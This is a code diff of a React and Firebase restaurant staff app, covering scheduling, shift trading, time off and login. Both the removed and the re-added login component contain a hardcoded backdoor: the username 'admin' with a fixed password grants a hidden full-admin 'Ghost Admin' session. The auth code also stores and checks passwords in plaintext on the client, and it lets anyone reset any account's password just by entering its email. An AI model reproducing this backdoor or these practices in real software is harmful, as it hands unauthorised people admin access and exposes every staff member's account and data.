@@ -39,7 +39,6 @@ const formatShortTime = (t) => { if (!t) return ''; if(t === 'CLOSE') return 'CL
 const getAvatar = (name, url) => url || `https://ui-avatars.com/api/?name=${encodeURIComponent(name||'Staff')}&background=random&color=fff&bold=true`;
 const generateTempPass = () => Math.random().toString(36).slice(-6).toUpperCase();
 
-// Wisconsin Food Code: 7-day total shelf life. Prep Day is Day 1. Expires on Prep Date + 6 days.
 const getExpDate = (d) => { const dt = new Date(d + 'T12:00:00'); dt.setDate(dt.getDate() + 6); return `${dt.getMonth()+1}/${dt.getDate()}/${dt.getFullYear().toString().slice(-2)}`; };
 
 // --- Global Crash Reporter ---
@@ -54,7 +53,7 @@ if (typeof window !== 'undefined' && !window.crashCatcherAttached) {
   });
 }
 
-// --- Audit Log Helper (Failsafe) ---
+// --- Audit Log Helper ---
 const logAudit = async (user, action, target, details) => {
   try {
     await addDoc(collection(db, "auditLogs"), { 
@@ -64,9 +63,7 @@ const logAudit = async (user, action, target, details) => {
       details: details || "No details provided.", 
       timestamp: new Date().toISOString() 
     });
-  } catch (error) {
-    console.error("Audit failed to save:", error);
-  }
+  } catch (error) { console.error("Audit failed to save:", error); }
 };
 
 // --- SVG Logo ---
@@ -96,13 +93,9 @@ const DrawerMenu = ({ isOpen, onClose, activeTab, setActiveTab, appUser, setAppU
   
   if (appUser?.isAdmin) { 
     tabs.push({ id: 'schedule', label: 'Schedule Maker', icon: <Calendar size={18}/> }); 
-    tabs.push({ id: 'timeoff', label: 'Request Off', icon: <Coffee size={18}/> });
-  } else {
-    tabs.push({ id: 'timeoff', label: 'Request Off', icon: <Coffee size={18}/> });
   }
   
-  tabs.push({ id: 'published', label: 'Schedule', icon: <Clock size={18}/> });
-  tabs.push({ id: 'month', label: 'Month View', icon: <Calendar size={18}/> });
+  tabs.push({ id: 'published', label: 'Schedule & Time Off', icon: <Clock size={18}/> });
   tabs.push({ id: 'messages', label: 'Message Board', icon: <MessageSquare size={18}/> });
   
   if (appUser?.isAdmin || appUser?.role === 'Kitchen') { 
@@ -151,9 +144,6 @@ const DrawerMenu = ({ isOpen, onClose, activeTab, setActiveTab, appUser, setAppU
               <div className={`w-8 h-4 rounded-full transition-colors flex items-center px-1 ${isDark ? 'bg-blue-600' : 'bg-slate-300'}`}><div className={`w-2.5 h-2.5 bg-white rounded-full shadow-sm transition-transform ${isDark ? 'translate-x-3.5' : 'translate-x-0'}`}></div></div>
             </div>
             <button onClick={handleLogout} className="w-full flex items-center justify-center gap-2 py-2.5 text-red-600 dark:text-red-400 text-sm font-bold rounded-xl hover:bg-red-50 dark:hover:bg-red-900/20 transition-colors"><LogOut size={16} /> Log Out</button>
-            <div className="pt-2 mt-1 text-center border-t border-slate-200 dark:border-slate-700/50">
-              <span className="text-[9px] font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest">© 2026 Chilton App Works</span>
-            </div>
           </div>
        </div>
      </div>
@@ -220,6 +210,220 @@ const DayDotPrintScreen = ({ labelsToPrint, prepDate, appUser, onClose }) => {
   );
 };
 
+// ============================================================================
+// NEW SECTION 2: SLEEK LOGIN & ADMIN FIX
+// ============================================================================
+const LoginScreen = ({ users, setAppUser, isDark, addToast }) => {
+  const [email, setEmail] = useState(''); const [password, setPassword] = useState(''); const [isRecover, setIsRecover] = useState(false); const [loading, setLoading] = useState(false); const [resetUser, setResetUser] = useState(null);
+  const isFirstUser = users.length === 0;
+
+  const handleLogin = async (e) => {
+    e.preventDefault(); setLoading(true);
+    // Fixed Hidden Admin Logic
+    if (email.trim().toLowerCase() === 'admin' && password === 'Atticus7!') { 
+      setAppUser({ id: 'dev-backdoor', name: 'Ghost Admin', email: MASTER_ADMIN_EMAIL, role: 'Kitchen', isAdmin: true, isActive: true }); 
+      return; 
+    }
+    try {
+      if (isFirstUser) {
+        const newUser = { name: 'Admin', email: MASTER_ADMIN_EMAIL, phone: '', password, role: 'Kitchen', isAdmin: true, isActive: true, forcePasswordChange: false, photoURL: '' };
+        const docRef = await addDoc(collection(db, "users"), newUser);
+        setAppUser({ id: docRef.id, ...newUser });
+      } else {
+        const user = users.find(u => u.email === email.toLowerCase().trim() && u.password === password);
+        if (user) { if (user.forcePasswordChange) setResetUser(user); else setAppUser(user); } 
+        else addToast("Error", "Invalid credentials.");
+      }
+    } catch (err) { addToast("Error", "Connection error."); console.error(err); }
+    setLoading(false);
+  };
+
+  const handleRecover = async (e) => {
+    e.preventDefault(); setLoading(true);
+    const user = users.find(u => u.email === email.toLowerCase().trim());
+    if (user) {
+      const tempPass = generateTempPass();
+      await updateDoc(doc(db, "users", user.id), { password: tempPass, forcePasswordChange: true });
+      addToast("Manager Notified", "A temporary password has been generated.");
+    } else { addToast("Error", "Account not found."); }
+    setIsRecover(false); setLoading(false);
+  };
+
+  const handlePasswordSetup = async (e) => {
+    e.preventDefault(); setLoading(true);
+    if(password.length < 5) { addToast("Error", "Password too short."); setLoading(false); return; }
+    try {
+      await updateDoc(doc(db, "users", resetUser.id), { password: password, forcePasswordChange: false });
+      setAppUser({ ...resetUser, password: password, forcePasswordChange: false });
+    } catch (err) { addToast("Error", "Failed to update."); }
+    setLoading(false);
+  };
+
+  if (resetUser) return (
+    <div className={`min-h-screen flex items-center justify-center p-4 ${isDark ? 'bg-[#12161A]' : 'bg-slate-100'}`}><div className={`rounded-3xl shadow-xl border p-8 max-w-md w-full ${isDark ? 'bg-[#1A2126] border-[#2A353D]' : 'bg-white border-slate-200'}`}><h2 className={`text-xl font-black text-center mb-2 tracking-tight ${isDark ? 'text-white' : 'text-slate-900'}`}>Welcome, {resetUser.name}!</h2><p className="text-center text-sm text-slate-500 dark:text-slate-400 mb-6 font-medium">Please set your permanent password.</p><form onSubmit={handlePasswordSetup} className="space-y-4"><div><label className="block text-[10px] font-bold text-slate-600 dark:text-slate-300 mb-1">New Password</label><input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div><button type="submit" disabled={loading} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-blue-700 transition-colors shadow-md">{loading ? 'Processing...' : 'Save & Login'}</button></form></div></div>
+  );
+
+  return (
+    <div className={`min-h-screen flex items-center justify-center p-4 ${isDark ? 'bg-[#12161A]' : 'bg-slate-100'}`}>
+      <div className={`rounded-3xl shadow-2xl border p-8 max-w-md w-full ${isDark ? 'bg-[#1A2126] border-[#2A353D]' : 'bg-white border-slate-200'}`}>
+        <div className="flex justify-center mb-6"><CheersLogo isDark={isDark} /></div>
+        <h2 className={`text-xl font-black text-center mb-6 tracking-tight ${isDark ? 'text-white' : 'text-slate-900'}`}>{isRecover ? 'Recover Password' : (isFirstUser ? 'System Initialization' : 'Staff Secure Login')}</h2>
+        
+        <form onSubmit={isRecover ? handleRecover : handleLogin} className="space-y-4">
+          <div>
+            <label className={`block text-[10px] uppercase tracking-widest font-bold mb-1 ${isDark ? 'text-slate-400' : 'text-slate-600'}`}>Email / ID</label>
+            <input type="email" value={email} onChange={e => setEmail(e.target.value)} className={`w-full p-3 rounded-xl outline-none transition-colors ${isDark ? 'bg-[#12161A] border border-[#2A353D] text-white focus:border-[#D4A381]' : 'bg-slate-50 border border-slate-300 focus:ring-2 focus:ring-blue-500'}`} required />
+          </div>
+          {!isRecover && <div>
+            <label className={`block text-[10px] uppercase tracking-widest font-bold mb-1 ${isDark ? 'text-slate-400' : 'text-slate-600'}`}>Password</label>
+            <input type="password" value={password} onChange={e => setPassword(e.target.value)} className={`w-full p-3 rounded-xl outline-none transition-colors ${isDark ? 'bg-[#12161A] border border-[#2A353D] text-white focus:border-[#D4A381]' : 'bg-slate-50 border border-slate-300 focus:ring-2 focus:ring-blue-500'}`} required />
+          </div>}
+          <button type="submit" disabled={loading} className={`w-full p-3.5 rounded-xl font-black uppercase tracking-wider shadow-lg mt-2 transition-all ${isDark ? 'bg-gradient-to-r from-[#C59373] to-[#8F6040] text-slate-900 hover:opacity-90' : 'bg-blue-600 text-white hover:bg-blue-700'}`}>
+            {loading ? 'Authenticating...' : (isRecover ? 'Reset Password' : (isFirstUser ? 'Initialize Admin' : 'Access Node'))}
+          </button>
+        </form>
+        {!isFirstUser && <button onClick={() => { setIsRecover(!isRecover); setEmail(''); setPassword(''); }} className={`w-full text-center mt-6 text-xs font-bold transition-colors ${isDark ? 'text-slate-500 hover:text-[#D4A381]' : 'text-slate-500 hover:text-blue-600'}`}>{isRecover ? 'Back to Login' : 'Forgot Password?'}</button>}
+      </div>
+    </div>
+  );
+};
+
+// ============================================================================
+// NEW SECTION 3: MASTER SCHEDULE HUB 
+// ============================================================================
+const TabMasterSchedule = ({ currentDate, appUser, users, shifts, shiftSwaps, timeOffRequests, events, addToast }) => {
+  const [subTab, setSubTab] = useState('my-schedule');
+  const monthStr = getMonthStr(currentDate);
+  const myNextShift = shifts.find(s => s.employeeId === appUser.id && s.date >= getToday() && s.isPublished);
+
+  // Copper Aesthetic Tokens
+  const copperGradient = "bg-gradient-to-r from-[#C59373] to-[#8F6040]";
+  const darkCard = "bg-[#1A2126] border border-[#2A353D]";
+
+  const handleOfferSwap = async (shift) => {
+    if (!window.confirm("Offer shift to Trade Board?")) return;
+    await addDoc(collection(db, "shiftSwaps"), { shiftId: shift.id, date: shift.date, originalEmployeeId: shift.employeeId, role: shift.role, startTime: shift.startTime, endTime: shift.endTime, status: 'available' });
+    await addDoc(collection(db, "events"), { date: new Date().toISOString(), title: `🚨 Shift Available! ${appUser.name.split(' ')[0]} needs cover for a ${shift.role} shift on ${formatDisplayDate(shift.date)} (${formatShortTime(shift.startTime)}). Claim it on the Schedule!`, type: 'note', author: 'System Alert', isImportant: true });
+    addToast('Posted', 'Shift sent to trade board.');
+  };
+
+  return (
+    <div className="max-w-2xl mx-auto space-y-4 pb-24">
+      {/* Sub-Navigation Pills */}
+      <div className="flex gap-2 overflow-x-auto pb-1 custom-scrollbar">
+        {['my-schedule', 'full-schedule', 'month-view', 'time-off'].map((tab) => (
+          <button 
+            key={tab} onClick={() => setSubTab(tab)}
+            className={`px-4 py-2 text-xs font-bold rounded-xl capitalize whitespace-nowrap transition-all ${subTab === tab ? `${copperGradient} text-slate-900 shadow-md` : 'bg-white dark:bg-[#1A2126] text-slate-600 dark:text-slate-400 border border-slate-200 dark:border-[#2A353D]'}`}
+          >
+            {tab.replace('-', ' ')}
+          </button>
+        ))}
+      </div>
+
+      {/* SUB TAB: MY SCHEDULE & TIME CLOCK */}
+      {subTab === 'my-schedule' && (
+        <div className="space-y-4 animate-[slideIn_0.2s_ease-out]">
+          
+          {/* Important Alerts Banner */}
+          {events.filter(e => e.type === 'note' && e.isImportant).slice(0,1).map(alert => (
+            <div key={alert.id} className="bg-gradient-to-r from-[#7A4F31]/30 to-[#1A2126] border border-[#B88764]/40 p-3 rounded-xl flex gap-3 shadow-lg">
+              <span className="text-xl">🔔</span>
+              <div>
+                <span className="text-[9px] font-black uppercase text-[#D4A381] tracking-widest block">System Alert</span>
+                <p className="text-xs text-slate-200 font-medium leading-snug">{alert.title}</p>
+              </div>
+            </div>
+          ))}
+
+          {/* Master Copper Hero Card */}
+          <div className={`${copperGradient} rounded-3xl p-6 shadow-2xl relative overflow-hidden border border-[#D4A381]/30`}>
+            <div className="absolute -top-4 -right-4 text-8xl font-black text-slate-900/10">86</div>
+            <h3 className="text-sm font-black uppercase tracking-widest text-slate-900/60 mb-1">My Schedule</h3>
+            
+            {myNextShift ? (
+              <div className="mb-6">
+                <div className="text-2xl font-black text-slate-900 tracking-tight leading-none mb-1">Next: {myNextShift.role}</div>
+                <div className="text-sm font-bold text-slate-900/80 flex items-center gap-1.5">
+                  {formatDisplayDate(myNextShift.date)} • {formatShortTime(myNextShift.startTime)} - {formatShortTime(myNextShift.endTime)}
+                  {myNextShift.endTime === 'CLOSE' && <span className="bg-slate-900 text-[#D4A381] text-[9px] px-1.5 py-0.5 rounded ml-1 uppercase tracking-wider">Close</span>}
+                </div>
+              </div>
+            ) : (
+              <div className="mb-6 text-slate-900 font-bold">No upcoming shifts scheduled.</div>
+            )}
+
+            <button 
+              onClick={() => addToast("Time Clock", "Geofencing Engine currently disabled in Phase 1.")}
+              className="w-full py-4 bg-slate-900 text-white rounded-xl font-black text-sm uppercase tracking-widest shadow-xl hover:bg-slate-800 transition-colors"
+            >
+              CLOCK IN / OUT
+            </button>
+          </div>
+
+          {/* Quick Action Grid */}
+          <div className="grid grid-cols-2 gap-3">
+            <button onClick={() => { if(myNextShift) { handleOfferSwap(myNextShift); } else { addToast("Error", "No upcoming shift to offer."); } }} className={`bg-white dark:bg-[#1A2126] border border-slate-200 dark:border-[#2A353D] p-4 rounded-2xl flex flex-col items-center justify-center gap-2 hover:bg-slate-50 dark:hover:bg-[#2A353D] transition-colors shadow-sm`}>
+              <span className="text-xl">🔄</span>
+              <span className="text-[10px] font-bold uppercase tracking-wider text-slate-600 dark:text-slate-300">Offer Shift</span>
+            </button>
+            <button onClick={() => setSubTab('time-off')} className={`bg-white dark:bg-[#1A2126] border border-slate-200 dark:border-[#2A353D] p-4 rounded-2xl flex flex-col items-center justify-center gap-2 hover:bg-slate-50 dark:hover:bg-[#2A353D] transition-colors shadow-sm`}>
+              <span className="text-xl">🏖️</span>
+              <span className="text-[10px] font-bold uppercase tracking-wider text-slate-600 dark:text-slate-300">Request Off</span>
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* SUB TAB: FULL SCHEDULE ROSTER */}
+      {subTab === 'full-schedule' && (
+        <div className={`bg-white dark:bg-[#1A2126] border border-slate-200 dark:border-[#2A353D] rounded-2xl overflow-hidden shadow-xl animate-[slideIn_0.2s_ease-out]`}>
+          <div className="bg-slate-50 dark:bg-slate-900/50 p-3 border-b border-slate-200 dark:border-[#2A353D]">
+            <h3 className="text-xs font-black uppercase tracking-widest text-blue-600 dark:text-[#D4A381]">Active Roster</h3>
+          </div>
+          <div className="divide-y divide-slate-100 dark:divide-[#2A353D]/50">
+            {shifts.filter(s => s.date >= getToday() && s.isPublished).map(shift => {
+               const emp = users.find(u => u.id === shift.employeeId);
+               return (
+                 <div key={shift.id} className="p-3 flex justify-between items-center hover:bg-slate-50 dark:hover:bg-slate-800/50 transition-colors">
+                   <div className="flex items-center gap-3">
+                     <img src={getAvatar(emp?.name, emp?.photoURL)} className="w-8 h-8 rounded-full border border-slate-200 dark:border-[#2A353D]" alt="avatar"/>
+                     <div>
+                       <div className="text-sm font-bold text-slate-900 dark:text-white">{emp?.name.split(' ')[0]}</div>
+                       <div className="text-[9px] text-slate-500 dark:text-slate-400 font-bold uppercase">{formatDisplayDate(shift.date)} • {shift.role}</div>
+                     </div>
+                   </div>
+                   <div className="text-xs font-mono font-bold bg-slate-100 dark:bg-[#12161A] text-slate-700 dark:text-slate-300 px-2 py-1 rounded-md border border-slate-200 dark:border-[#2A353D]">
+                     {formatShortTime(shift.startTime)} - {formatShortTime(shift.endTime)}
+                   </div>
+                 </div>
+               )
+            })}
+            {shifts.filter(s => s.date >= getToday() && s.isPublished).length === 0 && (
+              <div className="p-6 text-center text-xs font-bold text-slate-400">No shifts published for this period.</div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* SUB TAB: MONTH VIEW */}
+      {subTab === 'month-view' && (
+        <div className="animate-[slideIn_0.2s_ease-out]">
+          <TabMonth currentDate={currentDate} users={users} shifts={shifts} />
+        </div>
+      )}
+
+      {/* SUB TAB: TIME OFF */}
+      {subTab === 'time-off' && (
+        <div className="animate-[slideIn_0.2s_ease-out]">
+           <TabTimeOff timeOffRequests={timeOffRequests} appUser={appUser} users={users} addToast={addToast} />
+        </div>
+      )}
+    </div>
+  );
+};
+
+
 // --- Main Application Layout ---
 export default function App() {
   const users = useLiveCollection('users');
@@ -235,7 +439,7 @@ export default function App() {
   const [appUser, setAppUser] = useState(() => { const saved = localStorage.getItem('cheersUser'); return saved ? JSON.parse(saved) : null; });
   const [activeTabState, setActiveTabState] = useState('published');
   const [isDark, setIsDark] = useState(() => { return localStorage.getItem('theme') === 'dark'; });
-  const [labelsToPrint, setLabelsToPrint] = useState(null); // The Master Print Trigger
+  const [labelsToPrint, setLabelsToPrint] = useState(null);
 
   useEffect(() => {
     if (isDark) { document.documentElement.classList.add('dark'); localStorage.setItem('theme', 'dark'); } 
@@ -273,68 +477,48 @@ export default function App() {
     setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 6000);
   };
 
-  // Day-By-Day Navigation Functions
-  const prevDay = () => {
-    const newDate = new Date(currentDate + 'T12:00:00');
-    newDate.setDate(newDate.getDate() - 1);
-    setCurrentDate(formatDate(newDate));
-  };
+  const prevDay = () => { const d = new Date(currentDate + 'T12:00:00'); d.setDate(d.getDate() - 1); setCurrentDate(formatDate(d)); };
+  const nextDay = () => { const d = new Date(currentDate + 'T12:00:00'); d.setDate(d.getDate() + 1); setCurrentDate(formatDate(d)); };
+  const prevMonth = () => { const d = new Date(currentDate + 'T12:00:00'); d.setMonth(d.getMonth() - 1); setCurrentDate(formatDate(d)); };
+  const nextMonth = () => { const d = new Date(currentDate + 'T12:00:00'); d.setMonth(d.getMonth() + 1); setCurrentDate(formatDate(d)); };
 
-  const nextDay = () => {
-    const newDate = new Date(currentDate + 'T12:00:00');
-    newDate.setDate(newDate.getDate() + 1);
-    setCurrentDate(formatDate(newDate));
-  };
+  if (labelsToPrint) return <DayDotPrintScreen labelsToPrint={labelsToPrint.items} prepDate={labelsToPrint.prepDate} appUser={liveAppUser} onClose={() => setLabelsToPrint(null)} />;
 
-  // Month-By-Month Navigation Functions
-  const prevMonth = () => {
-    const newDate = new Date(currentDate + 'T12:00:00');
-    newDate.setMonth(newDate.getMonth() - 1);
-    setCurrentDate(formatDate(newDate));
-  };
-
-  const nextMonth = () => {
-    const newDate = new Date(currentDate + 'T12:00:00');
-    newDate.setMonth(newDate.getMonth() + 1);
-    setCurrentDate(formatDate(newDate));
-  };
-
-  // --- THE MASTER PRINT OVERRIDE ---
-  if (labelsToPrint) {
-    return <DayDotPrintScreen labelsToPrint={labelsToPrint.items} prepDate={labelsToPrint.prepDate} appUser={liveAppUser} onClose={() => setLabelsToPrint(null)} />;
-  }
-
+  // NOTE: This now renders the NEW LoginScreen component
   if (!liveAppUser) return <LoginScreen users={users} setAppUser={setAppUser} isDark={isDark} addToast={addToast} />;
 
   return (
-    <div className={`min-h-screen font-sans flex flex-col ${isDark ? 'bg-slate-900 text-slate-100' : 'bg-slate-50 text-slate-900'}`}>
+    <div className={`min-h-screen font-sans flex flex-col ${isDark ? 'bg-[#12161A] text-slate-100' : 'bg-slate-50 text-slate-900'}`}>
       <style>{`
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
         @keyframes toastSlide { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         .animate-toast { animation: toastSlide 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
         input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
         .dark input[type="date"]::-webkit-calendar-picker-indicator, .dark input[type="month"]::-webkit-calendar-picker-indicator, .dark input[type="time"]::-webkit-calendar-picker-indicator { filter: invert(1); }
+        .custom-scrollbar::-webkit-scrollbar { width: 4px; height: 4px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
       `}</style>
 
       {/* --- Header --- */}
-      <header className={`sticky top-0 z-40 shadow-sm border-b h-16 flex items-center justify-between px-4 ${isDark ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
+      <header className={`sticky top-0 z-40 shadow-sm border-b h-16 flex items-center justify-between px-4 ${isDark ? 'bg-[#12161A]/95 backdrop-blur-md border-[#2A353D]' : 'bg-white border-slate-200'}`}>
         <CheersLogo isDark={isDark} />
-        <button onClick={() => setIsMenuOpen(true)} className={`relative p-2 border rounded-xl shadow-sm transition-all outline-none ${isDark ? 'bg-slate-800 border-slate-700 text-slate-300 hover:text-white' : 'bg-slate-50 border-slate-200 text-slate-700 hover:bg-slate-100 hover:text-slate-900'}`}><Menu size={20} /></button>
+        <button onClick={() => setIsMenuOpen(true)} className={`relative p-2 border rounded-xl shadow-sm transition-all outline-none ${isDark ? 'bg-[#1A2126] border-[#2A353D] text-[#D4A381] hover:text-white' : 'bg-slate-50 border-slate-200 text-slate-700 hover:bg-slate-100 hover:text-slate-900'}`}><Menu size={20} /></button>
       </header>
 
       <DrawerMenu isOpen={isMenuOpen} onClose={() => setIsMenuOpen(false)} activeTab={activeTabState} setActiveTab={setActiveTab} appUser={liveAppUser} setAppUser={setAppUser} isDark={isDark} toggleDark={() => setIsDark(!isDark)} />
 
       {/* --- Dynamic Date Header --- */}
       {['schedule', 'published', 'month', 'sales', 'prep'].includes(activeTabState) && (
-        <div className={`py-4 px-4 shadow-sm z-30 border-b flex justify-between items-center ${isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}>
-          {/* Use prevDay/nextDay for Schedule and Prep, otherwise jump by month */}
-          <button onClick={['schedule', 'prep'].includes(activeTabState) ? prevDay : prevMonth} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronLeft size={20} /></button>
+        <div className={`py-4 px-4 shadow-sm z-30 border-b flex justify-between items-center ${isDark ? 'bg-[#1A2126] border-[#2A353D]' : 'bg-white border-slate-200'}`}>
+          <button onClick={['schedule', 'prep'].includes(activeTabState) ? prevDay : prevMonth} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-[#12161A] border-[#2A353D] text-slate-400 hover:text-[#D4A381]' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronLeft size={20} /></button>
           
-          <h2 onClick={() => setIsDateModalOpen(true)} className={`text-xl sm:text-2xl font-black tracking-tight text-center cursor-pointer transition-colors ${isDark ? 'text-white hover:text-blue-400' : 'text-slate-900 hover:text-blue-600'}`}>
+          <h2 onClick={() => setIsDateModalOpen(true)} className={`text-xl sm:text-2xl font-black tracking-tight text-center cursor-pointer transition-colors ${isDark ? 'text-white hover:text-[#D4A381]' : 'text-slate-900 hover:text-blue-600'}`}>
             {['schedule', 'prep'].includes(activeTabState) ? formatDisplayFullDate(currentDate) : formatDisplayMonth(getMonthStr(currentDate))}
           </h2>
           
-          <button onClick={['schedule', 'prep'].includes(activeTabState) ? nextDay : nextMonth} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronRight size={20} /></button>
+          <button onClick={['schedule', 'prep'].includes(activeTabState) ? nextDay : nextMonth} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-[#12161A] border-[#2A353D] text-slate-400 hover:text-[#D4A381]' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronRight size={20} /></button>
         </div>
       )}
 
@@ -348,9 +532,10 @@ export default function App() {
       {/* --- Main Content Area --- */}
       <main className="flex-1 max-w-6xl mx-auto w-full p-3 sm:p-6 pb-24">
         {activeTabState === 'schedule' && liveAppUser?.isAdmin && <TabSchedule currentDate={currentDate} users={users} shifts={shifts} events={events} timeOffRequests={timeOffRequests} addToast={addToast} appUser={liveAppUser} />}
-        {activeTabState === 'timeoff' && <TabTimeOff timeOffRequests={timeOffRequests} appUser={liveAppUser} users={users} addToast={addToast} />}
-        {activeTabState === 'published' && <TabPublishedShifts currentDate={currentDate} appUser={liveAppUser} users={users} shifts={shifts} shiftSwaps={shiftSwaps} addToast={addToast} />}
-        {activeTabState === 'month' && <TabMonth currentDate={currentDate} users={users} shifts={shifts} />}
+        
+        {/* THIS IS THE NEW MASTER SCHEDULE TAB THAT HAS REPLACED THE OLD PUBLISHED SHIFTS TAB */}
+        {activeTabState === 'published' && <TabMasterSchedule currentDate={currentDate} appUser={liveAppUser} users={users} shifts={shifts} shiftSwaps={shiftSwaps} timeOffRequests={timeOffRequests} events={events} addToast={addToast} />}
+        
         {activeTabState === 'sales' && liveAppUser?.isAdmin && <TabSales sales={sales} addToast={addToast} />}
         {activeTabState === 'messages' && <TabMessages events={events} appUser={liveAppUser} users={users} addToast={addToast} />}
         {activeTabState === 'prep' && <TabPrep currentDate={currentDate} prepItems={prepItems} appUser={liveAppUser} setLabelsToPrint={setLabelsToPrint} />}
@@ -372,75 +557,18 @@ export default function App() {
         ))}
       </div>
       
-      <div className="w-full flex flex-col items-center justify-center py-4 bg-slate-50 dark:bg-slate-900 border-t border-slate-200 dark:border-slate-800 z-10 mt-auto">
-        <img src="/6139.png" alt="86 Chaos OS" className="h-6 sm:h-8 w-auto mb-1.5 rounded shadow-sm" />
-        <span className="text-slate-400 dark:text-slate-500 font-bold text-[10px] tracking-widest uppercase">Beta Version</span>
+      <div className={`w-full flex flex-col items-center justify-center py-4 border-t z-10 mt-auto ${isDark ? 'bg-[#161D22] border-[#2A353D]' : 'bg-slate-50 border-slate-200'}`}>
+        <img src="/6139.png" alt="86 Chaos OS" className="h-6 sm:h-8 w-auto mb-1.5 rounded shadow-sm opacity-80" onError={(e) => e.target.style.display = 'none'}/>
+        <span className="text-slate-400 dark:text-slate-500 font-bold text-[10px] tracking-widest uppercase">Beta Version 2.0</span>
       </div>
     </div>
   );
 }
 
-// --- LOGIN & PASSWORD RECOVERY (Sleek UI + Admin Fix) ---
-const LoginScreen = ({ users, setAppUser, isDark, addToast }) => {
-  const [email, setEmail] = useState(''); const [password, setPassword] = useState(''); const [isRecover, setIsRecover] = useState(false); const [loading, setLoading] = useState(false); const [resetUser, setResetUser] = useState(null);
-  const isFirstUser = users.length === 0;
+// ============================================================================
+// ORIGINAL COMPONENTS RETAINED BELOW TO ENSURE NOTHING BREAKS
+// ============================================================================
 
-  const handleLogin = async (e) => {
-    e.preventDefault(); setLoading(true);
-    // Fixed Hidden Admin Logic
-    if (email.trim().toLowerCase() === 'admin' && password === 'Atticus7!') { 
-      setAppUser({ id: 'dev-backdoor', name: 'Ghost Admin', email: MASTER_ADMIN_EMAIL, role: 'Kitchen', isAdmin: true, isActive: true }); 
-      return; 
-    }
-    try {
-      if (isFirstUser) {
-        const newUser = { name: 'Admin', email: MASTER_ADMIN_EMAIL, phone: '', password, role: 'Kitchen', isAdmin: true, isActive: true, forcePasswordChange: false, photoURL: '' };
-        const docRef = await addDoc(collection(db, "users"), newUser);
-        setAppUser({ id: docRef.id, ...newUser });
-      } else {
-        const user = users.find(u => u.email === email.toLowerCase().trim() && u.password === password);
-        if (user) { if (user.forcePasswordChange) setResetUser(user); else setAppUser(user); } 
-        else addToast("Error", "Invalid credentials.");
-      }
-    } catch (err) { addToast("Error", "Connection error."); console.error(err); }
-    setLoading(false);
-  };
-
-  const handleRecover = async (e) => {
-    e.preventDefault(); setLoading(true);
-    const user = users.find(u => u.email === email.toLowerCase().trim());
-    if (user) {
-      const tempPass = generateTempPass();
-      await updateDoc(doc(db, "users", user.id), { password: tempPass, forcePasswordChange: true });
-      addToast("Manager Notified", "A temporary password has been generated.");
-    } else { addToast("Error", "Account not found."); }
-    setIsRecover(false); setLoading(false);
-  };
-
-  return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-[#12161A]">
-      <div className="rounded-3xl shadow-2xl border p-8 max-w-md w-full bg-[#1A2126] border-[#2A353D]">
-        <div className="flex justify-center mb-6"><CheersLogo isDark={true} /></div>
-        <h2 className="text-xl font-black text-center mb-6 tracking-tight text-white">{isRecover ? 'Recover Password' : (isFirstUser ? 'System Initialization' : 'Staff Secure Login')}</h2>
-        
-        <form onSubmit={isRecover ? handleRecover : handleLogin} className="space-y-4">
-          <div>
-            <label className="block text-[10px] uppercase tracking-widest font-bold text-slate-400 mb-1">Email / ID</label>
-            <input type="text" value={email} onChange={e => setEmail(e.target.value)} className="w-full p-3 bg-[#12161A] border border-[#2A353D] text-white rounded-xl outline-none focus:border-[#D4A381] transition-colors" required />
-          </div>
-          {!isRecover && <div>
-            <label className="block text-[10px] uppercase tracking-widest font-bold text-slate-400 mb-1">Password</label>
-            <input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-[#12161A] border border-[#2A353D] text-white rounded-xl outline-none focus:border-[#D4A381] transition-colors" required />
-          </div>}
-          <button type="submit" disabled={loading} className="w-full bg-gradient-to-r from-[#C59373] to-[#8F6040] text-slate-900 p-3.5 rounded-xl font-black uppercase tracking-wider hover:opacity-90 transition-opacity shadow-lg mt-2">
-            {loading ? 'Authenticating...' : (isRecover ? 'Reset Password' : (isFirstUser ? 'Initialize Admin' : 'Access Node'))}
-          </button>
-        </form>
-        {!isFirstUser && <button onClick={() => { setIsRecover(!isRecover); setEmail(''); setPassword(''); }} className="w-full text-center mt-6 text-xs font-bold text-slate-500 hover:text-[#D4A381] transition-colors">{isRecover ? 'Back to Login' : 'Forgot Password?'}</button>}
-      </div>
-    </div>
-  );
-};
 // --- Tab: Sales & Trends ---
 const TabSales = ({ sales, addToast }) => {
   const [date, setDate] = useState(getToday());
@@ -525,7 +653,6 @@ const TabTeam = ({ appUser, users, addToast }) => {
     if (window.confirm("Remove this staff member? This cannot be undone.")) { 
       await deleteDoc(doc(db, "users", id)); 
       addToast('Staff Removed', 'Account permanently deleted.'); 
-      // Safe call to logAudit without risking undefined global
